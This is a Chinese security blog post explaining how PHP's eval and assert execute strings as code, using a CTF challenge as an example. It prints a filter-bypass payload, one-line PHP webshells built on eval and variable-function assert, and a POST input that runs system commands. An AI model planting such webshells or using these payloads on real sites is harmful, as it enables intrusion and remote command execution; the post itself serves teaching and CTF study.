# 浅谈eval和assert

阅读量 **576244**

|评论 **20**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-03-18 14:30:07

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01e50d82c4eda2d34c.jpg)

eval和assert的特性经常把我搞懵，所以在这里记录一下。

###  eval 函数

php官方手册：<https://link.jianshu.com/?t=http://php.net/manual/zh/function.eval.php>

(PHP 4, PHP 5, PHP 7)

eval — 把字符串作为PHP代码执行

![](https://upload-images.jianshu.io/upload_images/9113969-13cb7a74c8d567cb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

该函数只有一个参数，即需要被执行的字符串代码。

  * 代码不能包含打开/关闭PHP标签，但可以用合适的 PHP tag 来离开、重新进入 PHP 模式。

    
    
    <?php
    eval('<?php echo "Hi!"; ?>');
    eval('echo "In PHP mode!"; ?>In HTML mode!<?php echo "Hi!";');
    

![](https://upload-images.jianshu.io/upload_images/9113969-0f56973dca412907.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![](https://upload-images.jianshu.io/upload_images/9113969-f5fd2352f49ac0cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

例如安恒杯9月月赛web2

    
    
    <?php 
    include 'flag.php';
    if(isset($_GET['code']))
    {
        $code=$_GET['code'];
        if(strlen($code)>35){
        die("Long.");
        }
        if(preg_match("/[A-Za-z0-9_$]+/",$code))
        {
            die("NO.");
        }
        @eval($code);
    }
    else
    {
        highlight_file(__FILE__);
    }
    //$hint="php function getFlag() to get flag";
    ?>
    

payload：

    
    
    code=?><?=`/???/??? ????.???`?>
    

`?>`闭合php文件开头的`<?php`，`<?=`可以输出。就是用了这个特性。

另外这里`<? ?>`是短标签，`<?php
?>`是长标签。在php的配置文件php.ini中有一个`short_open_tag`的值，开启以后可以使用PHP的短标签：`<?
?>`同时，只有开启这个才可以使用 `<?=` 以代替 `<? echo`。不过在php7中这个标签被移除了。

  * 并且传入的必须是有效的 PHP 代码，所有的语句必须以分号结尾。

![](https://upload-images.jianshu.io/upload_images/9113969-2deb4ade77b483a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

  * return 语句会立即中止当前字符串的执行。

![](https://upload-images.jianshu.io/upload_images/9113969-4a58228cc3de8389.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

  * 代码执行的作用域是调用 eval() 处的作用域。因此，eval() 里任何的变量定义、修改，都会在函数结束后被保留。

![](https://upload-images.jianshu.io/upload_images/9113969-cb2f01ab4588054d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

  * eval() 返回 NULL，除非在执行的代码中 return 了一个值，函数返回传递给 return 的值。

  
因为eval是一个语言构造器而不是一个函数，不能被 [可变函数](http://php.net/manual/zh/functions.variable-functions.php) 调用。

PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP
将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。

可变函数不能用于例如
[echo](http://php.net/manual/zh/function.echo.php)，[print](http://php.net/manual/zh/function.print.php)，[unset()](http://php.net/manual/zh/function.unset.php)，[isset()](http://php.net/manual/zh/function.isset.php)，[empty()](http://php.net/manual/zh/function.empty.php)，[include](http://php.net/manual/zh/function.include.php)，[require](http://php.net/manual/zh/function.require.php)
以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。

![](https://upload-images.jianshu.io/upload_images/9113969-8719e103914e6092.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

因此一般我们的一句话木马一般都写成

    
    
    <?php
    eval($_POST['2']);
    

而不是

    
    
    <?php
    $_POST['1']($_POST['2']);
    

不过我们依然可以传入`1=assert&2=system('ls')`来执行命令，也就是我们要说的assert函数。

## assert(PHP5 And PHP7)

php官方手册：<http://php.net/manual/zh/function.assert.php>

(PHP 4, PHP 5, PHP 7)

assert — 检查一个断言是否为 FALSE

![](https://upload-images.jianshu.io/upload_images/9113969-dc7eaf3fae674497.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![](https://upload-images.jianshu.io/upload_images/9113969-2685e9d11984781b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

  * 如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。

![](https://upload-images.jianshu.io/upload_images/9113969-dc40b4bbc7f8eb33.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

**assert()** 的行为可以通过
[assert_options()](http://php.net/manual/zh/function.assert-options.php) 来配置。

**assert_options**

(PHP 4, PHP 5, PHP 7)

assert_options — 设置/获取断言的各种标志

![](https://upload-images.jianshu.io/upload_images/9113969-3a89e84bb518c147.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

  * 在调用你定义的 [assert_options()](http://php.net/manual/zh/function.assert-options.php) 处理函数时，条件会转换为字符串，而布尔值 **`FALSE`** 会被转换成空字符串。
  * [assert_options()](http://php.net/manual/zh/function.assert-options.php) **`ASSERT_CALLBACK`** 配置指令允许设置回调函数来处理失败的断言。
  * 回调函数应该接受三个参数。 第一个参数包括了断言失败所在的文件。 第二个参数包含了断言失败所在的行号，第三个参数包含了失败的表达式

    
    
    <?php
    // 激活断言，并设置它为 quiet
    assert_options(ASSERT_ACTIVE, 1);
    assert_options(ASSERT_WARNING, 0);
    assert_options(ASSERT_QUIET_EVAL, 1);
    
    //创建处理函数
    function my_assert_handler($file, $line, $code, $desc = null)
    {
        echo "Assertion failed at $file:$line: $code";
        if ($desc) {
            echo ": $desc";
        }
        echo "n";
    }
    
    // 设置回调函数
    assert_options(ASSERT_CALLBACK, 'my_assert_handler');
    
    // Make an assertion that should fail
    assert('2 < 1', false);
    assert('2 < 1', 'Two is less than one');
    ?>
    

![](https://upload-images.jianshu.io/upload_images/9113969-fc6c48b801779fda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## assert(PHP7)

在PHP7中assert变成了一种语言结构而不是一个函数。

![](https://upload-images.jianshu.io/upload_images/9113969-f149fd2a3a3f7ab8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

也就是说像eval一样不支持可变函数。

![](https://upload-images.jianshu.io/upload_images/9113969-bc55ef1f3fb1f298.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

同样的

    
    
    <?php
    $_POST['1']($_POST['2']);
    

在php7中无法传入`1=assert&2=system('ls')`来执行命令

菜刀在实现文件管理器的时候用的恰好也是`assert`函数，这导致菜刀没办法在PHP7上正常运行。

另外php7中增加了断言的`Expectations`，`Expectations`增强了之前的`assert`方法，我们可以在开发或者生产环境中使用断言，其提供了可配置选项，我们可以针对不同的环境来使用不同的策略。

![](https://upload-images.jianshu.io/upload_images/9113969-1c53559a2752f9e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

我们可以通过在php.ini中设置`zend.assertions = -1`来关闭代码执行。

![](https://upload-images.jianshu.io/upload_images/9113969-d52d9877f3a56340.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

不过默认是打开的也就是`zend.assertions = 1`。

![](https://upload-images.jianshu.io/upload_images/9113969-42a574c12bddb4cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

具体底层分析可以参考柠檬师傅的文章：[从底层分析eval和assert的区别](https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html)

## Referer

[从底层分析eval和assert的区别](https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html)

[PHP7新特性一览](http://oopsguy.com/2016/10/22/php7-new-features/)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Smi1e** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/173201](/post/id/173201)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)
  * [PHP](/tag/PHP)

 **+1** __19赞

 __收藏

![](https://p5.ssl.qhimg.com/t010d9349529890bcdc.png) Smi1e

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

